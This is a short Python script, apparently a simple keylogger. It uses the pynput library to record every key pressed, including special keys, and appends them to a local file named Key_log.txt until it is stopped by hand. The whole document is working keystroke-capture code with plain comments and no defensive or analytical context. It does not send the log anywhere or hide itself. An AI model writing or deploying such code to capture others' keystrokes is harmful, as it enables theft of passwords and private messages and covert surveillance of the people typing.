from pynput import keyboard

def on_press(key): # Function that is triggered when a key is pressed
    try: # try to write the key character to file key_log.txt
        with open("Key_log.txt", "a") as log_file: 
            log_file.write(f'{key.char}') #
    except AttributeError: # If the key has no char attribute
        with open("Key_log.txt", "a") as log_file:
            log_file.write(f' [{key}]') # Record the special key's representation
with keyboard.Listener(on_press=on_press) as listener: # setup a keyboard listener to listen for key presses
    listener.join() # keep listening until manually stopped
    